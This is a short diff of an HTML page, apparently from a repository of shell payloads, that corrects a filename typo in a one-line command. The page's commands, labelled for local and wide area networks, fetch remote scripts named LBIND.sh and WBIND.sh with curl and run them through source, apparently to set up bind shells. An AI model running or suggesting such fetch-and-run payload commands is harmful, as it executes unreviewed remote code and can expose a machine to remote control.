@@ -11,4 +11,4 @@
   <pre> source <(curl -fsSl https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/LBIND.sh) </pre>
 <BR>
 <B>Wide Area Network</B>
- <pre>source <(curl -fsSl https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/WBIND.sh.sh) </pre>
+ <pre>source <(curl -fsSl https://raw.githubusercontent.com/efxtv/Payloads/main/Demo/WBIND.sh) </pre>
